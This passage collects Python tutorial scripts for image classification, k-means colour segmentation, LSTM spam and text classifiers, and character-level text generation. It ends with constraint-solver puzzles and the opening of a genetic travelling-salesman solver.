        title = f"{predicted_class_names[n].title()}, correct:{label_batch[n]}"
    plt.title(title, color=color)
    plt.axis('off')
_ = plt.suptitle("Model predictions (blue: correct, red: incorrect)")
plt.show()




import tensorflow as tf
from keras.models import Model
from keras.applications import MobileNetV2, ResNet50, InceptionV3 # try to use them and see which is better
from keras.layers import Dense
from keras.callbacks import ModelCheckpoint, TensorBoard
from keras.utils import get_file
from keras.preprocessing.image import ImageDataGenerator
import os
import pathlib
import numpy as np

batch_size = 32
num_classes = 5
epochs = 10

IMAGE_SHAPE = (224, 224, 3)


def load_data():
    """This function downloads, extracts, loads, normalizes and one-hot encodes Flower Photos dataset"""
    # download the dataset and extract it
    data_dir = get_file(origin='https://storage.googleapis.com/download.tensorflow.org/example_images/flower_photos.tgz',
                                         fname='flower_photos', untar=True)
    data_dir = pathlib.Path(data_dir)

    # count how many images are there
    image_count = len(list(data_dir.glob('*/*.jpg')))
    print("Number of images:", image_count)

    # get all classes for this dataset (types of flowers) excluding LICENSE file
    CLASS_NAMES = np.array([item.name for item in data_dir.glob('*') if item.name != "LICENSE.txt"])

    # roses = list(data_dir.glob('roses/*'))
    # 20% validation set 80% training set
    image_generator = ImageDataGenerator(rescale=1/255, validation_split=0.2)

    # make the training dataset generator
    train_data_gen = image_generator.flow_from_directory(directory=str(data_dir), batch_size=batch_size,
                                                        classes=list(CLASS_NAMES), target_size=(IMAGE_SHAPE[0], IMAGE_SHAPE[1]),
                                                        shuffle=True, subset="training")
    # make the validation dataset generator
    test_data_gen = image_generator.flow_from_directory(directory=str(data_dir), batch_size=batch_size, 
                                                        classes=list(CLASS_NAMES), target_size=(IMAGE_SHAPE[0], IMAGE_SHAPE[1]),
                                                        shuffle=True, subset="validation")

    return train_data_gen, test_data_gen, CLASS_NAMES


def create_model(input_shape):
    # load MobileNetV2
    model = MobileNetV2(input_shape=input_shape)
    # remove the last fully connected layer
    model.layers.pop()
    # freeze all the weights of the model except the last 4 layers
    for layer in model.layers[:-4]:
        layer.trainable = False
    # construct our own fully connected layer for classification
    output = Dense(num_classes, activation="softmax")
    # connect that dense layer to the model
    output = output(model.layers[-1].output)

    model = Model(inputs=model.inputs, outputs=output)

    # print the summary of the model architecture
    model.summary()

    # training the model using rmsprop optimizer
    model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])
    return model


if __name__ == "__main__":

    # load the data generators
    train_generator, validation_generator, class_names = load_data()

    # constructs the model
    model = create_model(input_shape=IMAGE_SHAPE)
    # model name
    model_name = "MobileNetV2_finetune_last5"

    # some nice callbacks
    tensorboard = TensorBoard(log_dir=f"logs/{model_name}")
    checkpoint = ModelCheckpoint(f"results/{model_name}" + "-loss-{val_loss:.2f}-acc-{val_acc:.2f}.h5",
                                save_best_only=True,
                                verbose=1)

    # make sure results folder exist
    if not os.path.isdir("results"):
        os.mkdir("results")

    # count number of steps per epoch
    training_steps_per_epoch = np.ceil(train_generator.samples / batch_size)
    validation_steps_per_epoch = np.ceil(validation_generator.samples / batch_size)

    # train using the generators
    model.fit_generator(train_generator, steps_per_epoch=training_steps_per_epoch,
                        validation_data=validation_generator, validation_steps=validation_steps_per_epoch,
                        epochs=epochs, verbose=1, callbacks=[tensorboard, checkpoint])




import cv2
import numpy as np
import matplotlib.pyplot as plt
import sys

# read the image
image = cv2.imread(sys.argv[1])

# convert to RGB
image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

# reshape the image to a 2D array of pixels and 3 color values (RGB)
pixel_values = image.reshape((-1, 3))
# convert to float
pixel_values = np.float32(pixel_values)

# define stopping criteria
criteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 100, 0.2)

# number of clusters (K)
k = 3
compactness, labels, (centers) = cv2.kmeans(pixel_values, k, None, criteria, 10, cv2.KMEANS_RANDOM_CENTERS)

# convert back to 8 bit values
centers = np.uint8(centers)

# flatten the labels array
labels = labels.flatten()

# convert all pixels to the color of the centroids
segmented_image = centers[labels]

# reshape back to the original image dimension
segmented_image = segmented_image.reshape(image.shape)

# show the image
plt.imshow(segmented_image)
plt.show()

# disable only the cluster number 2 (turn the pixel into black)
masked_image = np.copy(image)
# convert to the shape of a vector of pixel values
masked_image = masked_image.reshape((-1, 3))
# color (i.e cluster) to disable
cluster = 2
masked_image[labels == cluster] = [0, 0, 0]

# convert back to original shape
masked_image = masked_image.reshape(image.shape)
# show the image
plt.imshow(masked_image)
plt.show()




import cv2
import numpy as np

cap = cv2.VideoCapture(0)
k = 5

# define stopping criteria
criteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 100, 0.2)

while True:
    # read the image
    _, image = cap.read()

    # reshape the image to a 2D array of pixels and 3 color values (RGB)
    pixel_values = image.reshape((-1, 3))
    # convert to float
    pixel_values = np.float32(pixel_values)

    # number of clusters (K)
    _, labels, (centers) = cv2.kmeans(pixel_values, k, None, criteria, 10, cv2.KMEANS_RANDOM_CENTERS)

    # convert back to 8 bit values
    centers = np.uint8(centers)

    # convert all pixels to the color of the centroids
    segmented_image = centers[labels.flatten()]

    # reshape back to the original image dimension
    segmented_image = segmented_image.reshape(image.shape)

    # reshape labels too
    labels = labels.reshape(image.shape[0], image.shape[1])

    cv2.imshow("segmented_image", segmented_image)
    # visualize each segment

    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




# to use CPU uncomment below code
# import os
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )


from keras.preprocessing.text import Tokenizer
from keras.preprocessing.sequence import pad_sequences
from keras.utils import to_categorical
from keras.callbacks import ModelCheckpoint, TensorBoard
from sklearn.model_selection import train_test_split
import time
import numpy as np
import pickle

from utils import get_embedding_vectors, get_model, SEQUENCE_LENGTH, EMBEDDING_SIZE, TEST_SIZE
from utils import BATCH_SIZE, EPOCHS, int2label, label2int


def load_data():
    """
    Loads SMS Spam Collection dataset
    """
    texts, labels = [], []
    with open("data/SMSSpamCollection") as f:
        for line in f:
            split = line.split()
            labels.append(split[0].strip())
            texts.append(' '.join(split[1:]).strip())
    return texts, labels

    
# load the data
X, y = load_data()

# Text tokenization
# vectorizing text, turning each text into sequence of integers
tokenizer = Tokenizer()
tokenizer.fit_on_texts(X)
# lets dump it to a file, so we can use it in testing
pickle.dump(tokenizer, open("results/tokenizer.pickle", "wb"))

# convert to sequence of integers
X = tokenizer.texts_to_sequences(X)
print(X[0])
# convert to numpy arrays
X = np.array(X)
y = np.array(y)
# pad sequences at the beginning of each sequence with 0's
# for example if SEQUENCE_LENGTH=4:
# [[5, 3, 2], [5, 1, 2, 3], [3, 4]]
# will be transformed to:
# [[0, 5, 3, 2], [5, 1, 2, 3], [0, 0, 3, 4]]
X = pad_sequences(X, maxlen=SEQUENCE_LENGTH)
print(X[0])
# One Hot encoding labels
# [spam, ham, spam, ham, ham] will be converted to:
# [1, 0, 1, 0, 1] and then to:
# [[0, 1], [1, 0], [0, 1], [1, 0], [0, 1]]

y = [ label2int[label] for label in y ]
y = to_categorical(y)

print(y[0])

# split and shuffle
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=TEST_SIZE, random_state=7)

# constructs the model with 128 LSTM units
model = get_model(tokenizer=tokenizer, lstm_units=128)

# initialize our ModelCheckpoint and TensorBoard callbacks
# model checkpoint for saving best weights
model_checkpoint = ModelCheckpoint("results/spam_classifier_{val_loss:.2f}", save_best_only=True,
                                    verbose=1)
# for better visualization
tensorboard = TensorBoard(f"logs/spam_classifier_{time.time()}")
# print our data shapes
print("X_train.shape:", X_train.shape)
print("X_test.shape:", X_test.shape)
print("y_train.shape:", y_train.shape)
print("y_test.shape:", y_test.shape)
# train the model
model.fit(X_train, y_train, validation_data=(X_test, y_test),
          batch_size=BATCH_SIZE, epochs=EPOCHS,
          callbacks=[tensorboard, model_checkpoint],
          verbose=1)

# get the loss and metrics
result = model.evaluate(X_test, y_test)
# extract those
loss = result[0]
accuracy = result[1]
precision = result[2]
recall = result[3]

print(f"[+] Accuracy: {accuracy*100:.2f}%")
print(f"[+] Precision:   {precision*100:.2f}%")
print(f"[+] Recall:   {recall*100:.2f}%")




import os
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )
from utils import get_model, int2label, label2int
from keras.preprocessing.sequence import pad_sequences

import pickle
import numpy as np

SEQUENCE_LENGTH = 100

# get the tokenizer
tokenizer = pickle.load(open("results/tokenizer.pickle", "rb"))

model = get_model(tokenizer, 128)
model.load_weights("results/spam_classifier_0.05")

def get_predictions(text):
    sequence = tokenizer.texts_to_sequences([text])
    # pad the sequence
    sequence = pad_sequences(sequence, maxlen=SEQUENCE_LENGTH)
    # get the prediction
    prediction = model.predict(sequence)[0]
    # one-hot encoded vector, revert using np.argmax
    return int2label[np.argmax(prediction)]


while True:
    text = input("Enter the mail:")
    # convert to sequences
    print(get_predictions(text))




import tqdm
import numpy as np
from keras.preprocessing.sequence import pad_sequences
from keras.layers import Embedding, LSTM, Dropout, Dense
from keras.models import Sequential
import keras_metrics

SEQUENCE_LENGTH = 100 # the length of all sequences (number of words per sample)
EMBEDDING_SIZE = 100  # Using 100-Dimensional GloVe embedding vectors
TEST_SIZE = 0.25 # ratio of testing set

BATCH_SIZE = 64
EPOCHS = 20 # number of epochs

label2int = {"ham": 0, "spam": 1}
int2label = {0: "ham", 1: "spam"}

def get_embedding_vectors(tokenizer, dim=100):
    embedding_index = {}
    with open(f"data/glove.6B.{dim}d.txt", encoding='utf8') as f:
        for line in tqdm.tqdm(f, "Reading GloVe"):
            values = line.split()
            word = values[0]
            vectors = np.asarray(values[1:], dtype='float32')
            embedding_index[word] = vectors

    word_index = tokenizer.word_index
    # we do +1 because Tokenizer() starts from 1
    embedding_matrix = np.zeros((len(word_index)+1, dim))
    for word, i in word_index.items():
        embedding_vector = embedding_index.get(word)
        if embedding_vector is not None:
            # words not found will be 0s
            embedding_matrix[i] = embedding_vector
            
    return embedding_matrix


def get_model(tokenizer, lstm_units):
    """
    Constructs the model,
    Embedding vectors => LSTM => 2 output Fully-Connected neurons with softmax activation
    """
    # get the GloVe embedding vectors
    embedding_matrix = get_embedding_vectors(tokenizer)
    model = Sequential()
    model.add(Embedding(len(tokenizer.word_index)+1,
              EMBEDDING_SIZE,
              weights=[embedding_matrix],
              trainable=False,
              input_length=SEQUENCE_LENGTH))

    model.add(LSTM(lstm_units, recurrent_dropout=0.2))
    model.add(Dropout(0.3))
    model.add(Dense(2, activation="softmax"))
    # compile as rmsprop optimizer
    # aswell as with recall metric
    model.compile(optimizer="rmsprop", loss="categorical_crossentropy",
                  metrics=["accuracy", keras_metrics.precision(), keras_metrics.recall()])
    model.summary()
    return model




from tensorflow.keras.callbacks import TensorBoard

import os

from parameters import *
from utils import create_model, load_20_newsgroup_data

# create these folders if they does not exist
if not os.path.isdir("results"):
    os.mkdir("results")

if not os.path.isdir("logs"):
    os.mkdir("logs")

if not os.path.isdir("data"):
    os.mkdir("data")

# dataset name, IMDB movie reviews dataset
dataset_name = "20_news_group"
# get the unique model name based on hyper parameters on parameters.py
model_name = get_model_name(dataset_name)

# load the data
data = load_20_newsgroup_data(N_WORDS, SEQUENCE_LENGTH, TEST_SIZE, oov_token=OOV_TOKEN)

model = create_model(data["tokenizer"].word_index, units=UNITS, n_layers=N_LAYERS, 
                    cell=RNN_CELL, bidirectional=IS_BIDIRECTIONAL, embedding_size=EMBEDDING_SIZE, 
                    sequence_length=SEQUENCE_LENGTH, dropout=DROPOUT, 
                    loss=LOSS, optimizer=OPTIMIZER, output_length=data["y_train"][0].shape[0])

model.summary()

tensorboard = TensorBoard(log_dir=os.path.join("logs", model_name))

history = model.fit(data["X_train"], data["y_train"],
                    batch_size=BATCH_SIZE,
                    epochs=EPOCHS,
                    validation_data=(data["X_test"], data["y_test"]),
                    callbacks=[tensorboard],
                    verbose=1)


model.save(os.path.join("results", model_name) + ".h5")




from tensorflow.keras.layers import LSTM

# max number of words in each sentence
SEQUENCE_LENGTH = 300
# N-Dimensional GloVe embedding vectors
EMBEDDING_SIZE = 300
# number of words to use, discarding the rest
N_WORDS = 10000
# out of vocabulary token
OOV_TOKEN = None
# 30% testing set, 70% training set
TEST_SIZE = 0.3
# number of CELL layers
N_LAYERS = 1
# the RNN cell to use, LSTM in this case
RNN_CELL = LSTM
# whether it's a bidirectional RNN
IS_BIDIRECTIONAL = False
# number of units (RNN_CELL ,nodes) in each layer
UNITS = 128
# dropout rate
DROPOUT = 0.4
### Training parameters
LOSS = "categorical_crossentropy"
OPTIMIZER = "adam"
BATCH_SIZE = 64
EPOCHS = 6

def get_model_name(dataset_name):
    # construct the unique model name
    model_name = f"{dataset_name}-{RNN_CELL.__name__}-seq-{SEQUENCE_LENGTH}-em-{EMBEDDING_SIZE}-w-{N_WORDS}-layers-{N_LAYERS}-units-{UNITS}-opt-{OPTIMIZER}-BS-{BATCH_SIZE}-d-{DROPOUT}"
    if IS_BIDIRECTIONAL:
        # add 'bid' str if bidirectional
        model_name = "bid-" + model_name
    if OOV_TOKEN:
        # add 'oov' str if OOV token is specified
        model_name += "-oov"
    return model_name




from tensorflow.keras.callbacks import TensorBoard

import os

from parameters import *
from utils import create_model, load_imdb_data

# create these folders if they does not exist
if not os.path.isdir("results"):
    os.mkdir("results")

if not os.path.isdir("logs"):
    os.mkdir("logs")

if not os.path.isdir("data"):
    os.mkdir("data")

# dataset name, IMDB movie reviews dataset
dataset_name = "imdb"
# get the unique model name based on hyper parameters on parameters.py
model_name = get_model_name(dataset_name)

# load the data
data = load_imdb_data(N_WORDS, SEQUENCE_LENGTH, TEST_SIZE, oov_token=OOV_TOKEN)

model = create_model(data["tokenizer"].word_index, units=UNITS, n_layers=N_LAYERS, 
                    cell=RNN_CELL, bidirectional=IS_BIDIRECTIONAL, embedding_size=EMBEDDING_SIZE, 
                    sequence_length=SEQUENCE_LENGTH, dropout=DROPOUT, 
                    loss=LOSS, optimizer=OPTIMIZER, output_length=data["y_train"][0].shape[0])

model.summary()

tensorboard = TensorBoard(log_dir=os.path.join("logs", model_name))

history = model.fit(data["X_train"], data["y_train"],
                    batch_size=BATCH_SIZE,
                    epochs=EPOCHS,
                    validation_data=(data["X_test"], data["y_test"]),
                    callbacks=[tensorboard],
                    verbose=1)


model.save(os.path.join("results", model_name) + ".h5")




from tensorflow.keras.preprocessing.sequence import pad_sequences
import numpy as np

from parameters import *
from utils import create_model, load_20_newsgroup_data, load_imdb_data

import pickle
import os

# dataset name, IMDB movie reviews dataset
dataset_name = "imdb"
# get the unique model name based on hyper parameters on parameters.py
model_name = get_model_name(dataset_name)

# data = load_20_newsgroup_data(N_WORDS, SEQUENCE_LENGTH, TEST_SIZE, oov_token=OOV_TOKEN)
data = load_imdb_data(N_WORDS, SEQUENCE_LENGTH, TEST_SIZE, oov_token=OOV_TOKEN)

model = create_model(data["tokenizer"].word_index, units=UNITS, n_layers=N_LAYERS, 
                    cell=RNN_CELL, bidirectional=IS_BIDIRECTIONAL, embedding_size=EMBEDDING_SIZE, 
                    sequence_length=SEQUENCE_LENGTH, dropout=DROPOUT, 
                    loss=LOSS, optimizer=OPTIMIZER, output_length=data["y_train"][0].shape[0])

model.load_weights(os.path.join("results", f"{model_name}.h5"))


def get_predictions(text):
    sequence = data["tokenizer"].texts_to_sequences([text])
    # pad the sequences
    sequence = pad_sequences(sequence, maxlen=SEQUENCE_LENGTH)
    # get the prediction
    prediction = model.predict(sequence)[0]
    print("output vector:", prediction)
    return data["int2label"][np.argmax(prediction)]


while True:
    text = input("Enter your text: ")
    prediction = get_predictions(text)
    print("="*50)
    print("The class is:", prediction)




from tqdm import tqdm

import numpy as np
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.layers import Dense, Dropout, LSTM, Embedding, Bidirectional
from tensorflow.keras.models import Sequential
from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.utils import to_categorical
from sklearn.model_selection import train_test_split
from sklearn.datasets import fetch_20newsgroups

from glob import glob
import random


def get_embedding_vectors(word_index, embedding_size=100):
    embedding_matrix = np.zeros((len(word_index) + 1, embedding_size))
    with open(f"data/glove.6B.{embedding_size}d.txt", encoding="utf8") as f:
        for line in tqdm(f, "Reading GloVe"):
            values = line.split()
            # get the word as the first word in the line
            word = values[0]
            if word in word_index:
                idx = word_index[word]
                # get the vectors as the remaining values in the line
                embedding_matrix[idx] = np.array(values[1:], dtype="float32")
    return embedding_matrix


def create_model(word_index, units=128, n_layers=1, cell=LSTM, bidirectional=False,
                embedding_size=100, sequence_length=100, dropout=0.3, 
                loss="categorical_crossentropy", optimizer="adam", 
                output_length=2):
    """
    Constructs a RNN model given its parameters
    """
    embedding_matrix = get_embedding_vectors(word_index, embedding_size)
    model = Sequential()
    # add the embedding layer
    model.add(Embedding(len(word_index) + 1,
              embedding_size,
              weights=[embedding_matrix],
              trainable=False,
              input_length=sequence_length))

    for i in range(n_layers):
        if i == n_layers - 1:
            # last layer
            if bidirectional:
                model.add(Bidirectional(cell(units, return_sequences=False)))
            else:
                model.add(cell(units, return_sequences=False))
        else:
            # first layer or hidden layers
            if bidirectional:
                model.add(Bidirectional(cell(units, return_sequences=True)))
            else:
                model.add(cell(units, return_sequences=True))
        model.add(Dropout(dropout))

    model.add(Dense(output_length, activation="softmax"))
    # compile the model
    model.compile(optimizer=optimizer, loss=loss, metrics=["accuracy"])
    return model


    
def load_imdb_data(num_words, sequence_length, test_size=0.25, oov_token=None):
    # read reviews
    reviews = []
    with open("data/reviews.txt") as f:
        for review in f:
            review = review.strip()
            reviews.append(review)

    labels = []
    with open("data/labels.txt") as f:
        for label in f:
            label = label.strip()
            labels.append(label)


    # tokenize the dataset corpus, delete uncommon words such as names, etc.
    tokenizer = Tokenizer(num_words=num_words, oov_token=oov_token)
    tokenizer.fit_on_texts(reviews)
    X = tokenizer.texts_to_sequences(reviews)
    
    X, y = np.array(X), np.array(labels)

    # pad sequences with 0's
    X = pad_sequences(X, maxlen=sequence_length)

    # convert labels to one-hot encoded
    y = to_categorical(y)

    # split data to training and testing sets
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=test_size, random_state=1)

    data = {}

    data["X_train"] = X_train
    data["X_test"]= X_test
    data["y_train"] = y_train
    data["y_test"] = y_test
    data["tokenizer"] = tokenizer
    data["int2label"] =  {0: "negative", 1: "positive"}
    data["label2int"] = {"negative": 0, "positive": 1}
    
    return data


def load_20_newsgroup_data(num_words, sequence_length, test_size=0.25, oov_token=None):
    # load the 20 news groups dataset
    # shuffling the data & removing each document's header, signature blocks and quotation blocks
    dataset = fetch_20newsgroups(subset="all", shuffle=True, remove=("headers", "footers", "quotes"))
    documents = dataset.data
    labels = dataset.target

    tokenizer = Tokenizer(num_words=num_words, oov_token=oov_token)
    tokenizer.fit_on_texts(documents)
    X = tokenizer.texts_to_sequences(documents)
    
    X, y = np.array(X), np.array(labels)

    # pad sequences with 0's
    X = pad_sequences(X, maxlen=sequence_length)

    # convert labels to one-hot encoded
    y = to_categorical(y)

    # split data to training and testing sets
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=test_size, random_state=1)

    data = {}

    data["X_train"] = X_train
    data["X_test"]= X_test
    data["y_train"] = y_train
    data["y_test"] = y_test
    data["tokenizer"] = tokenizer

    data["int2label"] = { i: label for i, label in enumerate(dataset.target_names) }
    data["label2int"] = { label: i for i, label in enumerate(dataset.target_names) }
    
    return data




import numpy as np
import pickle
import tqdm
from keras.models import Sequential
from keras.layers import Dense, LSTM, Dropout, Activation
from keras.callbacks import ModelCheckpoint



message = """
Please choose which model you want to generate text with:
1 - Alice's wonderland
2 - Python Code
"""
choice = int(input(message))
assert choice == 1 or choice == 2

if choice == 1:
    char2int = pickle.load(open("data/wonderland-char2int.pickle", "rb"))
    int2char = pickle.load(open("data/wonderland-int2char.pickle", "rb"))
elif choice == 2:
    char2int = pickle.load(open("data/python-char2int.pickle", "rb"))
    int2char = pickle.load(open("data/python-int2char.pickle", "rb"))

sequence_length = 100
n_unique_chars = len(char2int)

# building the model
model = Sequential([
    LSTM(256, input_shape=(sequence_length, n_unique_chars), return_sequences=True),
    Dropout(0.3),
    LSTM(256),
    Dense(n_unique_chars, activation="softmax"),
])

if choice == 1:
    model.load_weights("results/wonderland-v2-0.75.h5")
elif choice == 2:
    model.load_weights("results/python-v2-0.30.h5")

seed = ""
print("Enter the seed, enter q to quit, maximum 100 characters:")
while True:
    result = input("")
    if result.lower() == "q":
        break
    seed += f"{result}\n"
seed = seed.lower()
n_chars = int(input("Enter number of characters you want to generate: "))

# generate 400 characters
generated = ""
for i in tqdm.tqdm(range(n_chars), "Generating text"):
    # make the input sequence
    X = np.zeros((1, sequence_length, n_unique_chars))
    for t, char in enumerate(seed):
        X[0, (sequence_length - len(seed)) + t, char2int[char]] = 1
    # predict the next character
    predicted = model.predict(X, verbose=0)[0]
    # converting the vector to an integer
    next_index = np.argmax(predicted)
    # converting the integer to a character
    next_char = int2char[next_index]
    # add the character to results
    generated += next_char
    # shift seed and the predicted character
    seed = seed[1:] + next_char

print("Generated text:")
print(generated)




import tensorflow as tf
import numpy as np
import os
import pickle

SEQUENCE_LENGTH = 200
FILE_PATH = "data/python_code.py"
BASENAME = os.path.basename(FILE_PATH)

text = open(FILE_PATH).read()
n_chars = len(text)
vocab = ''.join(sorted(set(text)))
print("vocab:", vocab)
n_unique_chars = len(vocab)
print("Number of characters:", n_chars)
print("Number of unique characters:", n_unique_chars)

# dictionary that converts characters to integers
char2int = {c: i for i, c in enumerate(vocab)}
# dictionary that converts integers to characters
int2char = {i: c for i, c in enumerate(vocab)}

# save these dictionaries for later generation
pickle.dump(char2int, open(f"{BASENAME}-char2int.pickle", "wb"))
pickle.dump(int2char, open(f"{BASENAME}-int2char.pickle", "wb"))

encoded_text = np.array([char2int[c] for c in text])




import tensorflow as tf
import numpy as np
import os
import pickle
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, LSTM, Dropout
from tensorflow.keras.callbacks import ModelCheckpoint
from string import punctuation

sequence_length = 100
BATCH_SIZE = 128
EPOCHS = 30
# dataset file path
FILE_PATH = "data/wonderland.txt"
# FILE_PATH = "data/python_code.py"
BASENAME = os.path.basename(FILE_PATH)

# commented because already downloaded
# import requests
# content = requests.get("http://www.gutenberg.org/cache/epub/11/pg11.txt").text
# open("data/wonderland.txt", "w", encoding="utf-8").write(content)

# read the data
text = open(FILE_PATH, encoding="utf-8").read()
# remove caps, comment this code if you want uppercase characters as well
text = text.lower()
# remove punctuation
text = text.translate(str.maketrans("", "", punctuation))
# print some stats
n_chars = len(text)
vocab = ''.join(sorted(set(text)))
print("unique_chars:", vocab)
n_unique_chars = len(vocab)
print("Number of characters:", n_chars)
print("Number of unique characters:", n_unique_chars)

# dictionary that converts characters to integers
char2int = {c: i for i, c in enumerate(vocab)}
# dictionary that converts integers to characters
int2char = {i: c for i, c in enumerate(vocab)}

# save these dictionaries for later generation
pickle.dump(char2int, open(f"{BASENAME}-char2int.pickle", "wb"))
pickle.dump(int2char, open(f"{BASENAME}-int2char.pickle", "wb"))

# convert all text into integers
encoded_text = np.array([char2int[c] for c in text])
# construct tf.data.Dataset object
char_dataset = tf.data.Dataset.from_tensor_slices(encoded_text)
# print first 5 characters
for char in char_dataset.take(5):
    print(char.numpy())

# build sequences by batching
sequences = char_dataset.batch(2*sequence_length + 1, drop_remainder=True)

def split_sample(sample):
    ds = tf.data.Dataset.from_tensors((sample[:sequence_length], sample[sequence_length]))
    for i in range(1, (len(sample)-1) // 2):
        input_ = sample[i: i+sequence_length]
        target = sample[i+sequence_length]
        other_ds = tf.data.Dataset.from_tensors((input_, target))
        ds = ds.concatenate(other_ds)
    return ds

def one_hot_samples(input_, target):
    return tf.one_hot(input_, n_unique_chars), tf.one_hot(target, n_unique_chars)

sentences = []
y_train = []
for i in range(0, len(text) - sequence_length):
    sentences.append(text[i: i + sequence_length])
    y_train.append(text[i+sequence_length])
print("Number of sentences:", len(sentences))

# vectorization
X = np.zeros((len(sentences), sequence_length, n_unique_chars))
y = np.zeros((len(sentences), n_unique_chars))

for i, sentence in enumerate(sentences):
    for t, char in enumerate(sentence):
        X[i, t, char2int[char]] = 1
        y[i, char2int[y_train[i]]] = 1

print("X.shape:", X.shape)

# building the model
# model = Sequential([
#     LSTM(128, input_shape=(sequence_length, n_unique_chars)),
#     Dense(n_unique_chars, activation="softmax"),
# ])

# a better model (slower to train obviously)
model = Sequential([
    LSTM(256, input_shape=(sequence_length, n_unique_chars), return_sequences=True),
    Dropout(0.3),
    LSTM(256),
    Dense(n_unique_chars, activation="softmax"),
])

# model.load_weights("results/wonderland-v2-2.48.h5")

model.summary()
model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

if not os.path.isdir("results"):
    os.mkdir("results")

checkpoint = ModelCheckpoint("results/wonderland-v2-{loss:.2f}.h5", verbose=1)

# train the model
model.fit(X, y, batch_size=BATCH_SIZE, epochs=EPOCHS, callbacks=[checkpoint])




from constraint import Problem, Domain, AllDifferentConstraint
import matplotlib.pyplot as plt
import numpy as np


def _get_pairs(variables):
        work = list(variables)
        pairs = [ (work[i], work[i+1]) for i in range(len(work)-1) ]
        return pairs

def n_queens(n=8):

    def not_in_diagonal(a, b):
        result = True
        for i in range(1, n):
            result = result and ( a != b + i )
        return result

    problem = Problem()
    variables = { f'x{i}' for i in range(n) }
    problem.addVariables(variables, Domain(set(range(1, n+1))))
    problem.addConstraint(AllDifferentConstraint())
    for pair in _get_pairs(variables):
        problem.addConstraint(not_in_diagonal, pair)
    return problem.getSolutions()


def magic_square(n=3):

    def all_equal(*variables):
        square = np.reshape(variables, (n, n))
        diagonal = sum(np.diagonal(square))
        b = True
        for i in range(n):
            b = b and sum(square[i, :]) == diagonal 
            b = b and sum(square[:, i]) == diagonal
        if b:
            print(square)
        return b

    problem = Problem()
    variables = { f'x{i}{j}' for i in range(1, n+1) for j in range(1, n+1) }
    problem.addVariables(variables, Domain(set(range(1, (n**2 + 2)))))
    problem.addConstraint(all_equal, variables)
    problem.addConstraint(AllDifferentConstraint())
    return problem.getSolutions()



def plot_queens(solutions):
    for solution in solutions:
        for row, column in solution.items():
            x = int(row.lstrip('x'))
            y = column
            plt.scatter(x, y, s=70)
        plt.grid()
        plt.show()

if __name__ == "__main__":
    # solutions = n_queens(n=12)
    # print(solutions)
    # plot_queens(solutions)

    solutions = magic_square(n=4)
    for solution in solutions:
        print(solution)




import numpy as np
import random
import operator
import pandas as pd
import matplotlib.pyplot as plt
import seaborn
from matplotlib import animation
from realtime_plot import realtime_plot
from threading import Thread, Event
from time import sleep

seaborn.set_style("dark")

stop_animation = Event()

# def animate_cities_and_routes():
#     global route

#     def wrapped():
#         # create figure
#         sleep(3)
#         print("thread:", route)
#         figure = plt.figure(figsize=(14, 8))
#         ax1 = figure.add_subplot(1, 1, 1)

#         def animate(i):
#             ax1.title.set_text("Real time routes")
#             for city in route:
#                 ax1.scatter(city.x, city.y, s=70, c='b')

#             ax1.plot([ city.x for city in route ], [city.y for city in route], c='r')
            
#         animation.FuncAnimation(figure, animate, interval=100)
#         plt.show()
#     t = Thread(target=wrapped)
#     t.start()

def plot_routes(initial_route, final_route):
    _, ax = plt.subplots(nrows=1, ncols=2)

    for col, route in zip(ax, [("Initial Route", initial_route), ("Final Route", final_route) ]):
        col.title.set_text(route[0])
        route = route[1]
        for city in route:
            col.scatter(city.x, city.y, s=70, c='b')

        col.plot([ city.x for city in route ], [city.y for city in route], c='r')
        col.plot([route[-1].x, route[0].x], [route[-1].x, route[-1].y])
    
    plt.show()

def animate_progress():
    global route
    global progress
    global stop_animation

    def animate():
        # figure = plt.figure()
        # ax1 = figure.add_subplot(1, 1, 1)
        figure, ax1 = plt.subplots(nrows=1, ncols=2)
        while True:

            ax1[0].clear()
            ax1[1].clear()

            # current routes and cities
            ax1[0].title.set_text("Current routes")
            

            for city in route:
                ax1[0].scatter(city.x, city.y, s=70, c='b')

            ax1[0].plot([ city.x for city in route ], [city.y for city in route], c='r')
            ax1[0].plot([route[-1].x, route[0].x], [route[-1].y, route[0].y], c='r')

            # current distance graph
            ax1[1].title.set_text("Current distance")
            ax1[1].plot(progress)
            ax1[1].set_ylabel("Distance")
            ax1[1].set_xlabel("Generation")

            plt.pause(0.05)


            if stop_animation.is_set():
                break
        plt.show()

    Thread(target=animate).start()


class City:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def distance(self, city):
        """Returns distance between self city and city"""
        x = abs(self.x - city.x)
        y = abs(self.y - city.y)
        return np.sqrt(x ** 2 + y ** 2)

    def __sub__(self, city):
        return self.distance(city)

    def __repr__(self):
        return f"({self.x}, {self.y})"

    def __str__(self):
        return self.__repr__()


class Fitness:
    def __init__(self, route):
        self.route = route

    def distance(self):
        distance = 0
        for i in range(len(self.route)):
            from_city = self.route[i]
            to_city = self.route[i+1] if i+i < len(self.route) else self.route[0]
            distance += (from_city - to_city)
        return distance

    def fitness(self):
        return 1 / self.distance()


def generate_cities(size):
    cities = []
    for i in range(size):
